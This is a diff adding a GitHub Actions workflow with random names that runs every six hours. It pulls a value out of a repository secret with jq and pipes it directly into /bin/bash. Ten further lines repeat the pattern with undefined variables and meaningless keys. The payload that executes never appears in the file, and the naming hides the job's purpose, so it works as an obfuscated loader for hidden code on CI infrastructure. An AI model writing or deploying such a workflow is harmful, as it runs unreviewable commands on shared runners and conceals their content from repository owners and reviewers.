@@ -1,0 +1,28 @@
+name: yanyanaisg
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '37 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yanyanaisg
+        env:
+          frcs355: ${{ secrets.frcs355 }}
+        run: |
+          echo $frcs355 | jq -r .icvb96 | /bin/bash
+          echo $va38 | jq -r .ozxck0273 | /bin/bash
+          echo $bhbls0909 | jq -r .h6 | /bin/bash
+          echo $qqx5612 | jq -r .f17 | /bin/bash
+          echo $ejwki41325 | jq -r .dbu10 | /bin/bash
+          echo $acx4276 | jq -r .ilt215 | /bin/bash
+          echo $zcomv5 | jq -r .bud802 | /bin/bash
+          echo $bj5 | jq -r .ldc8155 | /bin/bash
+          echo $wc4042 | jq -r .ezgng4362 | /bin/bash
+          echo $pvgt6 | jq -r .wc12903 | /bin/bash
+          echo $gqi323 | jq -r .c3 | /bin/bash
+
